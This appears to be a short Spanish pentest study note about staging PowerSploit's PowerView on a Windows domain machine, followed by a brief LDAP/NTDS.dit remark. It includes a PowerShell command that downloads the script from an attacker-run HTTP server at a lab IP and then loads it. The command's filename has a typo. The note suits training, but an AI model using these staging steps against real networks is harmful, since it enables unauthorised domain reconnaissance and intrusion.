
# PowerView: 

Para utilizar esta herramienta tenemos que intentar meterla a la maquina windows del dominio, y para ello debemos hacerlo utilizando nuestra maquina linux.

* Lo primero que debemos hacer es descargar en nuestra maquina Linux el repositorio de GitHub "Powersploit" que debemos buscar en Mozilla.
* Luego entramos a la direccion: Powersploit/Recon/PowerView.ps1 y, movemos el fichero a nuestro escritorio.
* Luego cambiamos la red de la maquina Linux para asegurarnos que esté en la misma red que en las maquinas Windows.
* Abrimos un servidor HTTP por el puerto 8000 con el siguiente comando: Python2 -m SimpleHTTPServer.
* Y en nuestra maquina Windows abrimos PowerShell y ejecutamos el siguiente comando: (New-Object System.NET.WebClient).DownloadFile("http://192.168.244.131:8000/New_PoweView.ps1","New_PowerView.ps1")
* Activamos el PowerView con el siguiente comando: ". .\New_PowerView.ps1" 

_Dirección IP de la maquina Linux, puerto del servidor, nombre del archivo, nombre que le pondremos cuando lo descarguemos._

#### _Comandos para enumeracion de informacion:_
[[Comandos de enumeración]]

# LDAP

Protocolo que nos permite comunicarnos con la base de datos y poder enumerar usuarios e información, por medio del archivo _NTDS.dit_.  


